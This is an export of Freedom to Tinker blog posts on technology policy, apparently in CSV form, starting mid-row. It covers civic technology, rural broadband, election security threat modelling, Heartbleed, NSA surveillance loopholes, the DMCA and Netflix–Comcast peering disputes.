volunteer who has mapped the DC restaurants that have been cited recently for health code violations. His next step is developing a mobile app. Given the ubiquity of the violations, I was glad I had already eaten. Beyond mobile, one of the most impressive recent innovations by the DC government is Advisory Neighborhood Commission 3F live streaming its monthly meetings. Advisory Neighborhood Commission meetings are not typically broadcast on public access television, therefore live streaming makes meetings available, for example, to people with kids who can’t get out in the evening and senior citizens or people with disabilities who cannot get to the meeting location. Live streaming uses only $75 of the Advisory Neighborhood Commission’s budget per meeting and people can ask questions directly beneath the feed or by reaching out to the Advisory Neighborhood Commission’s Chairman via Twitter. Another Advisory Neighborhood Commission records its meetings and posts them on YouTube subsequently. While these are great solutions for constituents who are tech savvy and have fast home broadband connections, to reach the widest possible audience, Advisory Neighborhood Commissions still must continue to use both on-line and off-line engagement methods. While increasing participation is very important, so is facilitating accountability. A local activist and Washington Post reporter both discussed the importance of responses to FOIA requests in conducting research, particularly on under-the-radar issues that are nonetheless affecting city residents’ lives. FOIAs have been a critical tool in preventing legal on-line gambling in DC and exposing corruption in the Office of the Chief Financial Officer regarding commercial property assessments. Based on the Summit, here are my three recommendations: (1) The DC Office of Open Government needs to have a more productive and collaborative relationship with the Mayor’s Office. The Mayor’s office needs to promote a culture that makes sharing information with both the public and across the city government a priority; (2) Cities that are integrating technology into governance effectively, such as New York, Boston, and Philadelphia, have someone leading those efforts from the Mayor’s office. Washington, DC needs leadership at that level; and (3) To eliminate the inconsistencies across city agencies, the DC government needs to establish written, uniform policies for responding to FOIAs and providing data sets that are easy to manipulate by members of the public and post these policies where the public can review them. The seeds of an open, efficient government exist, but will only grow with strong and committed leadership."
"270","2013-11-21","2023-03-24","https://freedom-to-tinker.com/2013/11/21/improve-connectivity-in-rural-communities-principle-9-for-fostering-civic-engagement-through-digital-technologies/","In my recent blog posts, I have been discussing ways that citizens can communicate with government officials through the Internet, social media, and wireless technology to solve problems in their communities and to effect public policy. Using technology for civic engagement, however, should not be limited to communications with elected or appointed government officials. One of the themes I have sought to address across my series of posts – and will discuss in more detail today – is that citizen-to-citizen communication through digital technologies for civic purposes is extremely important in building healthy communities. This is particularly true in rural areas. Improving digital connectivity in rural areas will help people communicate more effectively with civic institutions, such as schools and libraries, and commercial entities, such as commodities markets, that effect residents daily lives and economic well-being. Earlier this year I met with Tom Koutsky, Chief Policy Counsel for Connected Nation, a non-profit working to “accelerate broadband availability in underserved areas and increase broadband use in all areas.” When I told Mr. Koutsky that I wanted to learn more about the role of digital technologies in fostering civic engagement in rural areas, he told me that “you can’t develop one size fits all for non-urban areas. Not all rural communities have the same challenges, even if they are clearly different from urban areas.” For example, Connected Nation evaluated several South Carolina counties and found that overall the three main challenges were access (i.e. the number of providers), adoption (encompassing digital literacy and computer training) and the lack of telecommunications infrastructure linking interested industry or government users to the network. The combinations of those challenges, however, varied by county. In Saluda County, Connected Nation found a lack of infrastructure and industry, but solid training programs. In Greenwood County, backhaul infrastructure was in place, but not enough providers were operating. There are a wide variety of organizations seeking to increase broadband adoption in rural areas and the engagement in civic and economic life that follows, including the American Farm Bureau, Microsoft, the United States Cattlemen’s Association, the Bill & Melinda Gates Foundation, the Communications Workers of America, and many telecommunications providers serving rural areas. Mr. Koutsky told me that these organizations focus on building “one-to-many” relationships by forming partnerships between “anchor systems” – valued organizations with built-in constituencies in local communities – and the key civic institutions in the community, for instance, libraries and school systems. One project Mr. Koutsky mentioned, for example, is a statewide digital literacy effort with fifteen to twenty Boys Clubs in Tennessee. In addition, churches in rural areas are opening technology centers and community centers are hosting job-training programs, designed to teach adults digital literacy. Individuals and organizations working to improve broadband adoption are going directly to citizens because the governmental entities supporting broadband adoption vary greatly from state to state and can be difficult for citizens to identify on their own. For example, broadband adoption programs are supported through Connect Texas, which resides in the Texas Department of Agriculture and its Rural Affairs team. The State Librarian is the leader on broadband policy for Nevada’s seventeen counties. In Michigan, Connected Nation works with the state’s Public Service Commission. Connected Nation’s approach to assisting rural communities in identifying solutions that allow them to use broadband to spur innovation and civic participation is similar to the process that I discussed in an earlier post regarding Memphis’s efforts to revitalize several of its neighborhoods. Connected Nation evaluates the strengths and weaknesses of rural communities by sending local planning teams to build data-driven profiles of each area. This approach allows Connected Nation to tailor broadband adoption solutions to specific communities and community leaders to measure their areas according to a common framework – the National Broadband Plan. Connected Nation’s community facilitators help community leaders share information about their needs and make plans as to how broadband can be deployed around the civic and economic drivers in the community such as agricultural facilities, industrial plants, schools, hospitals, government buildings, and tourist attractions. Once community planners have, for example, mapping data on where broadband providers are already operating in the community, local governments can make better-informed decisions about where economic development such as a new subdivision or hospital should be located. Where, for example, additional wireless infrastructure is needed, the various stakeholders such as the water company with a tall water tower, the wireless provider seeking a site for an antenna, the school superintendent researching potential locations for a new school, and farmers whose equipment relies on GPS, have an opportunity to discuss their high speed Internet needs and work cooperatively. In addition, telecommunications providers will learn where the opportunities are for potential future build-out and where their competitors are investing in facilities. Mr. Koutsky suggested that this type of information will “allow the market to shape itself.” What happens in a rural community with affordable access to wireline and wireless broadband? Its residents in the agricultural industry use modern, self-guided farm equipment, such as tractors that are dependent on GPS systems and satellites. Farmers have the ability to track commodities prices and conduct transactions through wireline broadband connections and through wireless devices. Parents and teachers can communicate about a child’s education through e-mail. Students can bring their own devices back and forth from school and use the Internet to bridge the gap between class and home. Over the long-term, this type of access will be critical to the survival of small communities as they are better able to compete with urban areas to keep their own young people and attract investment and new residents from elsewhere."
"271","2018-03-15","2023-03-24","https://freedom-to-tinker.com/2018/03/15/whats-new-with-blocksci-princetons-blockchain-analysis-tool/","Six months ago we released the initial version of BlockSci, a fast and expressive tool to analyze public blockchains. In the accompanying paper we explained how we used it to answer scientific questions about security, privacy, miner behavior, and economics using blockchain data. BlockSci has a number of other applications including forensics and as an educational tool. Since then we’ve heard from a number of researchers and developers who’ve found it useful, and there’s already a published paper on ransomware that has made use of it. We’re grateful for the pull requests and bug reports on GitHub from the community. We’ve also used it to deep-dive into some of the strange corners of blockchain data. We’ve made enhancements including a 5x speed improvement over the initial version (which was already several hundred times faster than previous tools). Today we’re happy to announce BlockSci 0.4.5, which has a large number of feature enhancements and bug fixes. As just one example, Bitcoin’s SegWit update introduces the concept of addresses that have different representations but are equivalent; tools such as blockchain.info are confused by this and return incorrect (or at least unexpected) values for the balance held by such addresses. BlockSci handles these nuances correctly. We think BlockSci is now ready for serious use, although it is still beta software. Here are a number of ideas on how you can use it in your projects or contribute to its development. We plan to release talks and tutorials on BlockSci, and improve its documentation. I’ll give a brief talk about it at the MIT Bitcoin Expo this Saturday; then Harry Kalodner and Malte Möser will join me for a BlockSci tutorial/workshop at MIT on Monday, March 19, organized by the Digital Currency Initiative and Fidelity Labs. Videos of both events will be available. We now have two priorities for the development of BlockSci. The first is to make it possible to implement almost all analyses in Python with the speed of C++. To enable this we are building a function composition interface to automatically translate Python to C++. The second is to better support graph queries and improved clustering of the transaction graph. We’ve teamed up with our colleagues in the theoretical computer science group to adapt sophisticated graph clustering algorithms to blockchain data. If this effort succeeds, it will be a foundational part of how we understand blockchains, just as PageRank is a fundamental part of how we understand the structure of the web. Stay tuned!"
"272","2013-02-18","2023-03-24","https://freedom-to-tinker.com/2013/02/18/presidential-commission-on-election-reform-good-news-bad/","In his State of the Union address, President Obama stated: “But defending our freedom is not the job of our military alone. We must all do our part to make sure our God-given rights are protected here at home. That includes our most fundamental right as citizens: the right to vote. When any Americans – no matter where they live or what their party – are denied that right simply because they can’t wait for five, six, seven hours just to cast their ballot, we are betraying our ideals. That’s why, tonight, I’m announcing a non-partisan commission to improve the voting experience in America. And I’m asking two long-time experts in the field, who’ve recently served as the top attorneys for my campaign and for Governor Romney’s campaign, to lead it. We can fix this, and we will. The American people demand it. And so does our democracy.” The White House announced that the commission will be led by Robert Bauer and Ben Ginsberg, attorneys for the Obama and Romney campaigns. According to the New York Times, the panel will include lawyers plus “election officials and customer service specialists — possibly from theme parks and other crowded places”. I have no doubt that all of these are valuable areas where we need expertise in solving problems with long lines. But at the same time, it’s critical to recognize that any solution to solving problems will undoubtedly involve technology – and for that, there must be technologists on the panel. For example, if the panel determines that making it easier for people to register or check their address online is a good idea (which I expect will be one outcome), they need technical experts to help understand the security and privacy issues associated with such requirements. My greatest fear is that the commission will blindly recommend internet voting as a cure-all. As readers of my postings on this blog know, internet voting has yet to show promise as a secure solution to voting, and it risks threatening everyone’s vote. Here’s hoping that the yet-to-be-named members of the panel will include not just lawyers, election officials, and customer service specialists, but also a leading technical expert – and not someone from one of the other fields claiming technical expertise."
"273","2016-08-03","2023-03-24","https://freedom-to-tinker.com/2016/08/03/election-security-as-a-national-security-issue/","We recently learned that Russian state actors may have been responsible for the DNC emails recently leaked to Wikileaks. Earlier this spring, once they became aware of the hack, the DNC hired Crowdstrike, an incident response firm. The New York Times reports: Preliminary conclusions were discussed last week at a weekly cyberintelligence meeting for senior officials. The Crowdstrike report, supported by several other firms that have examined the same bits of code and telltale “metadata” left on documents that were released before WikiLeaks’ publication of the larger trove, concludes that the Federal Security Service, known as the F.S.B., entered the committee’s networks last summer. President Obama added that “on a regular basis, [the Russians] try to influence elections in Europe.” For the sake of this blog piece, and it’s not really a stretch, let’s take it as a given that foreign nation-state actors including Russia have a large interest in the outcome of U.S. elections and are willing to take all sorts of unseemly steps to influence what happens here. Let’s take it as a given that this is undesirable and talk about how we might stop it. It’s bad enough to see foreign actors leaking emails with partisan intent. To make matters worse, Bruce Schneier in a Washington Post op-ed and many other security experts in the past have been worried about our voting systems themselves being hacked. How bad could this get? Several companies are now offering Internet-based voting systems alongside apparently unfounded claims as to their security. In one example, Washington D.C. looked at using one such system for its local elections and had a “pilot” in 2010, wherein the University of Michigan’s Alex Halderman and his students found and exploited significant security vulnerabilities. Had this system been used in a real election, any foreign nation-state actor could have done the same. Luckily, these systems aren’t widely used. How vulnerable are our nation’s election systems, as they’ll be used this November 2016, to being manipulated by foreign nation-state actors? The answer depends on how close the election will be. Consider Bush v. Gore in 2000. If an attacker, knowing it would be a very close election, had found a way to specifically manipulate the outcome in Florida, then their attack could well have had a decisive impact. Of course, predicting election outcomes is as much an art as a science, so an attacker would need to hedge their bets and go after the voting systems in multiple “battleground” states. Conversely, there’s no point in going after highly polarized states, where small changes will have no decisive impact. As an attacker, you want to leave a minimal footprint. How good are we at defending ourselves? Will cyber attacks on current voting systems leave evidence that can be detected prior to our elections? Let’s consider the possible attacks and how our defenses might respond. Voter de-registration: The purpose of a many attacks is simply to break things. Applied with partisan intent, you’d want to break things for one party more than the other. The easiest attack would be to hack a voter registration system, deleting voters who you believe are likely to support the candidate you don’t like. For voters who have registered for a political party, you know everything you need to know for who to delete. For independent voters you can probabilistically infer a their political opinions based on how their local precinct votes and on other demographic variables. (Political scientists do this sort of thing all the time.) Selectively destroying voter registration databases is likely to be recoverable. Such voters could demand to vote “provisional ballots” and those ballots would get counted as normal, once the voter registration databases were restored. Vote flipping: A nastier attack would require an attacker to access the computers inside DRE voting systems. (“Direct recording electronic” systems are typically touch-screen computers with no voter-verifiable paper trail. The only record of a voter’s ballot is stored electronically, inside the computer.) These voting systems are typically not connected to the Internet, although they do connect to election management computers, and those sometimes use modems to gather data from remote precincts. (Details vary from state to state and even county to county.) From the perspective of a nation-state cyber attacker, a modem might as well be a direct connection to the Internet. Once you can get malware into one of these election management computers, you can delete or flip votes. If you’re especially clever, you can use the occasional connections from these election management computers to the voting machines and corrupt the voting machines themselves. (We showed how to do these sort of viral attacks as part of the California Top to Bottom Review in 2007.) With paperless DRE systems, attacked by a competent nation-state actor, there will be no reason to believe any of the electronic records are intact, and a competent attacker would presumably also be good enough to clean up on their way out, so there wouldn’t necessarily even be any evidence of the attack. The good news is that paperless DRE systems are losing market share and being replaced slowly-but-surely with several varieties of paper-ballot systems (some hand-marked and electronically scanned, others machine-marked). A foreign nation-state adversary can’t reach across the Internet and change what’s printed on a piece of paper, which means that a post-election auditing strategy to compare the electronic results to the paper results can efficiently detect (and thus deter) electronic tampering. Where would an adversary attack? The most bang-for-the-buck for a foreign nation-state bent on corrupting our election would be to find a way to tamper with paperless DRE voting systems in a battleground state. So where then? Check out the NYT’s interactive “paths to the White House” page, wherein you can play “what-if” games on which states might have what impact in the Electoral College. The top battleground state is Florida, but thanks in part to the disastrous 2006 election in Florida’s 13th Congressional district, Florida dumped its DRE voting systems for optically scanned paper ballots; it would be much harder for an adversarial cyber attack to go undetected. What about other battleground states? Following the data in the Verified Voting website, Pennsylvania continues to use paperless DREs as does Georgia. Much of Ohio uses DRE systems with “toilet paper roll” printers, where voters are largely unable to detect if anything is printed incorrectly, so we’ll lump them in with the paperless states. North Carolina uses a mix of technologies, some of which are more vulnerable than others. So let’s say the Russians want to rig the election for Trump. If they could guarantee a Trump win in Pennsylvania, Georgia, Ohio, and North Carolina, then a Florida victory could put Trump over the top. Even without conspiracy theories, Florida will still be an intensely fought battleground state, but we don’t need a foreign government making it any worse. So what should these sensitive states do in the short term? At this point, it’s far too late to require non-trivial changes in election technologies or even most procedures. They’re committed to what they’ve got and how they’ll use it. We could imagine requiring some essential improvements (security patches and updates installed, intrusion detection and monitoring equipment installed, etc.) and even some sophisticated analyses (e.g., pulling voting machines off the line and conducting detailed / destructive analyses of their internal state, going beyond the weak tamper-protection mechanisms presently in place). Despite all of this, we could well end up in a scenario where we conclude that we have unreliable or tampered election data and cannot use it to produce a meaningful vote tally. Consider also that all an adversary needs to do is raise enough doubt that the loser has seemingly legitimate grounds to dispute the result. Trump is already suggesting that this November’s election might be rigged, without any particular evidence to support this conjecture. This makes it all the more essential that we have procedures that all parties can agree to for recounts, for audits, and for what to do when those indicate discrepancies. In case of emergency, break glass. If we’re facing a situation where we see tampering on a massive scale, we could end up in a crisis far worse than Florida after the Bush/Gore election of 2000. If we do nothing until after we find problems, every proposed solution will be tinted with its partisan impact, making it difficult to reach any sort of procedural consensus. Nobody wants to imagine a case where our electronic voting systems have been utterly compromised, but if we establish processes and procedures, in advance, for dealing with these contingencies, such as commissioning paper ballots and rerunning the elections in impacted areas, we will disincentivize foreign election adversaries and preserve the integrity of our democracy. (Addendum: contingency planning was exactly the topic of discussion after Hurricane Sandy disrupted elections across the Northeast in November 2012. It would be useful to revisit whatever changes were made then, in light of the new threat landscape we have today.) Related reading: David Dill on why online voting is a bad idea. David Jefferson on why online voting is a bad idea, and why voting security is a national security issue. The Boston Globe covered this story with quotes from Barbara Simons and Ron Rivest. The Christian Science Monitor ran an op-ed by Jason Healey, suggesting many possible responses, including hacking back at the Russians, and another op-ed by Scott Shackelford, discussing cybersecurity “codes of conduct” and the need to treat voting equipment as “critical infrastructure”."
"274","2013-10-24","2023-03-24","https://freedom-to-tinker.com/2013/10/24/wall-street-software-failure-and-a-relationship-to-voting/","An article in The Register explains what happened in the Aug 1 2012 Wall Street glitch that cost Knight Capital $440M, resulted in a $12M fine, nearly bankrupted Knight Capital (and forced them to merge with someone else). In short, there were 8 servers that handled trades; 7 of them were correctly upgraded with new software, but the 8th was not. A particular type of transaction triggered the updated code, which worked properly on the upgraded servers. On the non-upgraded server, the transaction triggered an obsolete piece of software, which behaved altogether differently. The result was large numbers of incorrect “buy” transactions. Bottom line is that the cause of the failure was lack of careful procedures in how the software was deployed, coupled with a poor design choice that allowed a new feature to reuse a previously used obsolete option, which meant that the trigger (instead of being ignored of causing an error) caused an unanticipated result. So what does this have to do voting? It’s not hard to imagine an internet voting scheme using 8 servers, and even if the software doesn’t have security flaws per se, a botched upgrade like this might work just fine for 7/8 of the voters, and silently fail for the 1/8. If the procedures aren’t in place to check all of the systems (and such procedures apparently didn’t exist at Knight Capital), a functional check might not detect a mismatch. This experience emphasizes that proper operation isn’t just having the software itself being built correctly – it’s also having it fielded properly. In a way this is similar to the DC internet voting experiment – in that case, there was a bug in the software, but that particular bug wouldn’t have been exploitable if it hadn’t been for a mistake in how the software was fielded, replacing one version of a software library with a different version that had an exploitable bug. [This is not to suggest that this was the only bug in the DC voting software, or that internet voting is safe, just tying to the particular exploit that happened.]"
"275","2014-04-10","2023-03-24","https://freedom-to-tinker.com/2014/04/10/heartsick-about-heartbleed/","Ed Felten provides good advice on this blog about what to do in the wake of Heartbleed, and I’ve read some good technical discussions of the technical problem (see this for a particularly understandable explanation). Update Apr 11: To understand what Heartbleed is all about, see XKCD. Best. Explanation. Ever. In this brief posting, I want to look at a different angle – what’s the scope of the vulnerability? I’m going to be (moderately) optimistic and suggest that within a week, major sites of all shapes and sizes (banks, e-shopping, government) will have installed the patches to their web servers and generated new keys/certificates, so it’s safe to visit them to change your password (if it’s an important account), and move on with your life. [That’s being optimistic – the realist in me says that there will be some sites that will take months to get patched, because the approval process for big corporations and government agencies is some cumbersome that they can’t say “emergency override”, and fix the problem quickly.] But there’s three other classes of sites we should also be concerned about. First, there’s the medium sized companies – too big to use an outsourced hosting provider that will automatically do the patching for them, but not big enough that they have a well-defined process for rolling out an emergency patch to production web servers. A lot of e-commerce sites fit into this category – and these may well be the riskiest sites. Those using hosting providers – like the mom & pop pizza shop – may get upgraded by the provider, but probably won’t know that they need to replace their certificates. Certificate Authorities should reach out to their customers to encourage them to get a replacement – but unless they offer significant discounts, that offer may fall on deaf ears. Second, the products out there that aren’t web servers, but still use OpenSSL. There’s lots of these sorts of products, and in many cases the organizations that use them have no idea that OpenSSL is buried deep inside – and the vendor itself may not be aware, since OpenSSL may be embedded in a library that gets embedded, or it may have been inserted by a programmer who left the company years ago. (We saw a scenario similar to this a few years ago when there was a serious vulnerability in a low-end Microsoft database product – and many products had it embedded but no one knew about it.) Third, and scariest, are the embedded devices. How many ATMs, manufacturing devices, monitoring cameras, etc use OpenSSL because vendors got burned when it came out that their communications were unencrypted? So they did the “right” thing, embedded OpenSSL – and now perhaps made things even worse. True, these devices aren’t likely to have a lot of passwords to be stolen from memory via the Heartbleed vulnerability, but there may be other sensitive information that can be retrieved. Obviously there’s some overlap between the second and third of these, but I separate them out because 2 is fundamentally about “computers” in the traditional sense that are not running web servers, and 3 is about embedded devices that happen to be running web servers. The threat that every password and every private key have been stolen are almost certainly overblown. But at the same time, we shouldn’t draw the line too narrowly – there are a lot of things beyond just “Apache running OpenSSL” that need to be examined."
"276","2014-07-11","2023-03-24","https://freedom-to-tinker.com/2014/07/11/our-response-to-the-nsa-reaction-to-our-new-internet-traffic-shaping-paper/","CBS News and a host of other outlets have covered my new paper with Sharon Goldberg, Loopholes for Circumventing the Constitution: Warrantless Bulk Surveillance on Americans by Collecting Network Traffic Abroad. We’ll present the paper on July 18 at HotPETS [slides, pdf], right after a keynote by Bill Binney (the NSA whistleblower), and at TPRC in September. Meanwhile, the NSA has responded to our paper in a clever way that avoids addressing what our paper is actually about. In the paper, we reveal known and new legal and technical loopholes that enable internet traffic shaping by intelligence authorities to circumvent constitutional safeguards for Americans. The paper is in some ways a classic exercise in threat modeling, but what’s rather new is our combination of descriptive legal analysis with methods from computer science. Thus, we’re able to identify interdependent legal and technical loopholes, mostly in internet routing. We’ll definitely be pursuing similar projects in the future and hope we get other folks to adopt such multidisciplinary methods too. As to the media coverage, the CBS News piece contains some outstanding reporting and an official NSA statement that seeks – but fails – to debunk our analysis: However, an NSA spokesperson denied that either EO 12333 or USSID 18 “authorizes targeting of U.S. persons for electronic surveillance by routing their communications outside of the U.S.,” in an emailed statement to CBS News. “Absent limited exception (for example, in an emergency), the Foreign Intelligence Surveillance Act requires that we get a court order to target any U.S. person anywhere in the world for electronic surveillance. In order to get such an order, we have to establish, to the satisfaction of a federal judge, probable cause to believe that the U.S. person is an agent of a foreign power,” the spokesperson said. The NSA statement sidetracks our analysis by re-framing the issue to construct a legal situation that conveniently evades the main argument of our paper. Notice how the NSA concentrates on the legality of targeting U.S. persons, while we argue that these loopholes exist when i) surveillance is conducted abroad and ii) when the authorities do not “intentionally target a U.S. person.” The NSA statement, however, only talks about situations in which U.S. persons are “targeted” in the legal sense. As we describe at length in our paper, there are several situations in which authorities don’t intentionally target a U.S. person according to the legal definition, but the internet traffic of many Americans can in fact be affected. The best evidence of that point came a few days after we released our paper, in a Washington Post piece that sources original NSA documents on presumed foreignness – confirming exactly what we outline in our paper. Concrete examples include untargeted bulk surveillance (for instance based on non-personal “selectors” or search terms) and the fact that data collected abroad may be presumed foreign. Another clear-cut example is conducting surveillance for a particular policy objective, such as “cybersecurity”. In addition, data on Americans may be retained and further processed when it was “incidentally” or “inadvertently” collected through surveillance that did not have the goal of “targeting a U.S. person” in the legal sense. Quoting the recent Washington Post piece: Nine of 10 account holders found in a large cache of intercepted conversations, which former NSA contractor Edward Snowden provided in full to The Post, were not the intended surveillance targets but were caught in a net the agency had cast for somebody else. This issue has already received a lot of attention over the last months, but this high percentage is new: the personal information of all these account holders may be collected and retained, even though the surveillance operation was not intentionally targeting a U.S. person according to the legal definition. As so often happens in law, legal speak in the books may obscure what really is going on on the ground. Another point to emphasize is that those “limited exceptions (for example, an emergency)” from the NSA statement are outlined in USSID 18 section 4.1, and in fact span four heavily redacted pages. It’s quite impossible to tell what lies beneath those redactions – beginning on page 11 of our paper, we make a start and highlight what passages are particularly important to de-classify or include in FOIA requests. In any event, it’s quite a stretch to brand four full pages of exceptions – which add up to dozens of actual situations – as “limited”. Bruce Schneier’s blogpost is also worth reading. The expert discussion below his post really captures what blogging is all about. Our paper is still a work in progress. In addition to adding recently disclosed information (such as Greenwald’s book and the Washington Post piece), we’ll spend more time analyzing the solutions at hand – from technical, policy, and legal perspectives. The Guardian reports that the U.S. Government’s Privacy and Civil Liberties Oversight Board (PCLOB) will decide on July 23rd whether it will review EO 12333; hopefully the PCLOB will take note of our work so far. In any event, your comments here or by dropping us an email are more than appreciated."
"277","2013-03-29","2023-03-24","https://freedom-to-tinker.com/2013/03/29/how-the-dmca-chills-research/","I have a new piece in Slate, on how the DMCA chills security research. In the piece, I tell three stories of DMCA threats against Alex Halderman and me, and talk about how Congress can fix the problem. “The Chilling Effects of the DMCA: The outdated copyright law doesn’t just hurt consumers—it cripples researchers.” “These days almost everything we do in life is mediated by technology. Too often the systems we rely on are black boxes that we aren’t allowed to adjust, repair, or—too often—even to understand. A new generation of students wants to open them up, see how they work, and improve them. These students are the key to our future productivity—not to mention the security of our devices today. What we need is for the law to get out of their way.”"
"278","2015-03-25","2023-03-24","https://freedom-to-tinker.com/2015/03/25/why-your-netflix-traffic-is-slow-and-why-the-open-internet-order-wont-necessarily-make-it-faster/","The FCC recently released the Open Internet Order, which has much to say about “net neutrality” whether (and in what circumstances) an Internet service provider is permitted to prioritize traffic. I’ll leave more detailed thoughts on the order itself to future posts; in this post, I would like to clarify what seems to be a fairly widespread misconception about the sources of Internet congestion, and why “net neutrality” has very little to do with the performance problems between Netflix and consumer ISPs such as Comcast. Much of the popular media has led consumers to believe that the reason that certain Internet traffic—specifically, Netflix video streams—were experiencing poor performance because Internet service providers are explicitly slowing down Internet traffic. John Oliver accuses Comcast of intentionally slowing down Netflix traffic (an Oatmeal cartoon reiterates this claim). These caricatures are false, and they demonstrate a fundamental misunderstanding of how Internet connectivity works, what led to the congestion in the first place, and the economics of how the problems were ultimately resolved. In fact, while there are certainly many valid arguments to support an open Internet, “faster Netflix” turns out to be a relatively unrelated concern. Contrary to what many have been led to believe, there is currently no evidence to suggest that Comcast made an explicit decision to slow down streaming traffic; rather, the slowdown resulted from high volumes of streaming video, which congested Internet links between the video content and the users themselves. Who is “at fault” for creating that congestion, who is responsible for mitigating that congestion, and who should pay to increase capacity are all important (and contentious) questions to which there are no simple answers. To say that “net neutrality” will fix this problem, however, reflects a fundamental misunderstanding. Below, I explain what actually caused the congestion, how the problem was ultimately resolved, and why the prevailing issue has more to do with Internet economics and market power than it does with policies like network neutrality. A (simplified) illustration of how Comcast users actually stream Netflix traffic (early 2013). Internet paths between consumers (“eyeballs”) and content typically traverse multiple Internet service providers. For example, prior to March 2014, there were several paths between Comcast and Netflix via multiple “transit providers”, including Cogent, Level 3, Tata, and others. In all of these cases, Netflix paid these transit providers for connectivity to Comcast customers. Comcast, in contrast, had what is called a “settlement-free peering” (or, “peering” for short) relationship with each of these transit providers, where Comcast and each of these providers deemed it mutually beneficial to interconnect. So far, all is normal Internet economics: parties who garner benefit from interconnection pay their “providers” for Internet connectivity, as Netflix did with its transit providers; parties who see mutual benefit in interconnecting do not exchange money. The Internet slows down (mid-2013 through early 2014). Around mid-2013, Comcast users (and other users) began to see congested Internet paths to various Internet destinations, not only to Netflix, but also to other Internet destinations. This phenomenon occurred because the video traffic was congesting paths not only to Netflix, but also paths to other destinations that had some path segments in common with paths to Netflix. In our ongoing BISmark project, we continually collect measurements from hundreds of home networks around the world. In mid-2013, we noticed and documented this congestion; our findings showed that this congestion, visible as extremely high latency, appeared on paths to many Internet destinations. The plot below shows an one consumer Internet connection that we measured in January 2014, which routinely experienced high latency to many Internet destinations every evening during “prime time”—oddly coinciding with peak video streaming hours from home networks. A “normal” latency plot would show flat lines, reflecting latencies that roughly correspond to the speed of light along that end-to-end path (plus small amounts of queueing). In contrast, the plot below shows striking diurnal latency spikes. When we noticed this phenomenon, we raised it to Comcast’s attention. As it turns out, Comcast already knew about it, and it was clear how to solve the problem: Connect directly to Netflix with high-capacity links. The question was: who should pay for the interconnection? Comcast or Netflix? The peering dispute: Who should pay? (late 2013 to early 2014) For a period of several months, while Comcast and Netflix were sorting out the answer to this question, Comcast customers experienced routinely high latency during peak hours, undoubtedly caused by congestion induced by video streaming. At this point (and as documented in opposing FCC filings), each side had a story to tell: Netflix claims that they were paying for transit to Comcast customers through their transit ISPs, and that they should not be responsible for upgrading the (congested) peering links between Comcast and the transit providers. The FCC declaration went so far as to claim that Comcast was intentionally letting peering links congest (see paragraph 29 of the declaration) to force Netflix to pay for direct connectivity. (Here is precisely where the confusion with net neutrality and paid prioritization comes into play, but this is not about paid prioritization, but rather about who should pay who for connectivity. More on that later.) Comcast claims that Netflix was sending traffic at such high volumes as to intentionally congest the links between different transit ISPs and Comcast, essentially taking a page from Norton’s “peering playbook” and forcing Comcast and its peers (i.e., the transit providers, Cogent, Level 3, Tata, and others) to upgrade capacity one-by-one, before sending traffic down a different path, congesting that, and forcing an upgrade. Their position was that Netflix was sending more traffic through these transit providers than the transit providers could handle, and thus that Netflix or their transit providers should pay to connect to Comcast directly. Comcast also implies that certain transit providers such as Cogent are likely the source of congested paths, a claim that has been explored but not yet conclusively proved one way or the other, owing to the difficulty of locating these points of congestion (more on that in a future post). Resolving the dispute: Paid peering (March 2014). Both sides of this argument are reasonable and plausible—this is a classic “peering dispute”, which is nothing new on the Internet; in the past, these disputes have even partitioned the Internet, keeping some users on the Internet from communicating with others. The main difference in the recent peering dispute is that the stakes are higher. The loser of this argument is essentially who blinks first. The best technical solution (and what ultimately happened) is that Netflix and Comcast should interconnect directly. But, who should pay for that interconnection? Should Netflix pay Comcast, since Netflix depends on reaching its subscribers, many of whom are Comcast customers? Or, should Comcast pay Netflix, since Comcast subscribers would be unhappy with poor Netflix performance? This is where market leverage comes into play: Because most consumers do not have choice in broadband Internet providers, Comcast arguably (and, empirically speaking, as well) has more market leverage: They can afford to ask Netflix to pay for that direct link—a common Internet business relationship called paid peering—because they have more market power. This is exactly what happened, and once Netflix paid Comcast for the direct peering link, congestion was relieved and performance returned to normal. Note: Despite how popular media might present matters, this is not paid prioritization (which would amount to Comcast asking Netflix to pay for higher priority), but rather Internet economics that has borne itself out in peculiar ways because of the market structures. Whether or not it is “right” that Comcast has such leverage is perhaps a philosophical debate, but it is also worth remembering that the classification of the Internet as an information service (regulation that the government is now backtracking on) is part of what got us into this situation in the first place. And, while it is also worth considering whether the impending merger between Comcast and Time Warner Cable might exacerbate the current situation, I predict that this is unlikely. In general, as one access ISP gains more market share, a content provider such as Netflix depends on connectivity to that ISP even more, potentially extracting increasingly higher prices for interconnection. In the specific case of Comcast and Time Warner, it is difficult to predict exactly how much additional leverage this will create, but as it turns out, these two ISPs are already in markets where they are not competing with one another, so this specific merger is unlikely to dramatically change the current situation. Various technical and policy solutions could change the landscape, or at least mitigate these problems. Among them, fair queueing at interconnection points to ensure that one type of traffic does not clobber the performance of other traffic flows, might help mitigate some of these problems in the short term. The types of prioritization that the Open Internet Order deals with are, interestingly, one way of coping with congested links. Note that the Open Internet Order does not prohibit all prioritization, only paid prioritization. Thus, we will certainly see ISPs continue to use prioritization to manage congestion—prioritization is, in fact, a necessary tool for managing limited resources such as bandwidth. The real solution, however, likely has little to do with prioritization at all and more likely hinges on increased competition among access ISPs."
"279","2013-05-17","2023-03-24","https://freedom-to-tinker.com/2013/05/17/blocking-of-google-hangouts-android-app/","Earlier this week, online news sites started reporting the apparent blocking of Google’s Google+ Hangout video-chat application on Android over AT&T’s cellular network [SlashGear, Time, ArsTechnica]. Several of the articles noted the relationship to an earlier controversy concerning AT&T and Apple’s FaceTime application. Our Mobile Broadband Working Group at the FCC’s Open Internet Advisory Committee released an case study on the AT&T’s handling of FaceTime in January of this year. Our report may help inform the new debate on the handling of the Google Hangout video app on cellular networks. Addendum (5/21/2013): AT&T announces support for FaceTime over cellular under all pricing plans over LTE by the end of the year [MacObserver, The Register]."
